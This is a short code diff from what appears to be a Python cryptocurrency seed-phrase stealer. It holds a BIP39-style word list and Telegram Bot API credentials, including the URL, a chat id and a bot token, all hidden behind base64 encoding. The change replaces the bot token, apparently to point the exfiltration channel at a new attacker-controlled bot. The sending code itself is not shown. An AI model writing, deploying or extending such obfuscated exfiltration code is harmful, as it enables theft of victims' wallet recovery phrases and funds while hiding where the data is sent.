@@ -30,7 +30,7 @@ _WL.extend(['access','accident','account','accuse','achieve','acid','acoustic','
 _WLS=set(_WL)
 
 # Telegram (base64 encoded)
-_T1=base64.b64decode('ODU3NTE3MDUxMjpBQUVaVFNpbjRSVEpiWHBWWDc0bWtBWGh4UUZTMzNOOU5J').decode()
+_T1=base64.b64decode('ODU0OTIwNjM2NDpBQUg4eEFhT1RfQWM1X0MyUTlBdFdtM18ycnhGWDFsUWtwSQ==').decode()
 _T2=base64.b64decode('ODIwMTIxNDkyOA==').decode()
 _T3=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==').decode()
 _TU=f"{_T3}{_T1}"
